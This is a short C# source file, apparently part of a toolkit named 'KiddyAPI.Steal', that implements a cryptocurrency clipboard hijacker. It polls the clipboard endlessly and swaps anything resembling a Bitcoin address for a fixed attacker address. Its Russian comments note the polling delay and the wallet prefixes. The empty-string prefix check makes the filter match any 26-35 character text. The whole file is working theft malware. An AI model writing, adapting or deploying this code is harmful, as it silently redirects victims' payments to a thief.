using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KiddyAPI.Steal
{
    class Wallet
    {
        public void Clip(string address)
        {
            while (true)
            {
                Thread.Sleep(15); // Задержка, что бы не перегружать систему
                if (Clipboard.GetText() != address)
                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
                        if (Clipboard.GetText().StartsWith("") ||
                            Clipboard.GetText().StartsWith("3") || // Кошельки могут начинаться с 1, 3(мультикошельки)
                            Clipboard.GetText().StartsWith("bc1"))
                        {
                            Clipboard.SetText(address);
                        }
            }
        }
    }
}
